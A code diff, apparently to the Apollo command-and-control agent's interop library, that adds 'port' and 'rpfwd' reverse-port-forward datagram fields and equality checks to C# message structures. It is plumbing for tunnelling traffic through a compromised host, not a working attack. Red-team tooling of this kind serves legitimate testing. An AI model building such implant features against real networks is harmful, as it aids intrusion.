@@ -7,6 +7,7 @@ using ApolloInterop.Enums.ApolloEnums;
 using System.Net;
 using System.IO;
 using ApolloInterop.Structs.ApolloStructs;
+using System.Reflection;
 
 namespace ApolloInterop.Structs
 {
@@ -532,6 +533,8 @@ namespace ApolloInterop.Structs
             public string Data;
             [DataMember(Name = "exit")]
             public bool Exit;
+            [DataMember(Name = "port")]
+            public int Port;
         }
 
         [DataContract]
@@ -911,6 +914,8 @@ namespace ApolloInterop.Structs
             public MythicTaskResponse[] Responses;
             [DataMember(Name = "socks")]
             public SocksDatagram[] Socks;
+            [DataMember(Name = "rpfwd")]
+            public SocksDatagram[] Rpfwd;
 
             public override bool Equals(object obj)
             {
@@ -933,6 +938,13 @@ namespace ApolloInterop.Structs
                 for (int i = 0; i < this.Socks.Length; i++)
                 {
                     if (!this.Socks[i].Equals(obj.Socks[i]))
+                    {
+                        return false;
+                    }
+                }
+                for (int i = 0; i < this.Rpfwd.Length; i++)
+                {
+                    if (!this.Rpfwd[i].Equals(obj.Rpfwd[i]))
                     {
                         return false;
                     }
@@ -1142,6 +1154,8 @@ namespace ApolloInterop.Structs
             public DelegateMessage[] Delegates;
             [DataMember(Name = "socks")]
             public SocksDatagram[] SocksDatagrams;
+            [DataMember(Name = "rpfwd")]
+            public SocksDatagram[] RpfwdDatagrams;
             [DataMember(Name = "session_key")]
             public string SessionKey;
             [DataMember(Name = "session_id")]
